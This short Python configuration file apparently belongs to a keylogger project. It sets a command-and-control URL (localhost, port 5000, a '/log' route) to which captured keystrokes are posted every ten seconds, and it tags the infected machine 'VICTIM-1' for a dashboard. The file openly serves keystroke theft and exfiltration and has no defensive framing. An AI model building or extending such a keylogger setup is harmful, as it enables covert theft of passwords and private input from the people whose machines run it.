# C2 Server Configuration 
C2_HOST = "http://127.0.0.1"   
C2_PORT = 5000                  # must match server.py
C2_ENDPOINT = "/log"            # the route that receives data

# Full URL the keylogger will POST to
C2_URL = f"{C2_HOST}:{C2_PORT}{C2_ENDPOINT}"

# Keylogger Configuration
SEND_INTERVAL = 10              # send captured keys every X seconds
MACHINE_ID = "VICTIM-1"        # identifier for this machine in the dashboard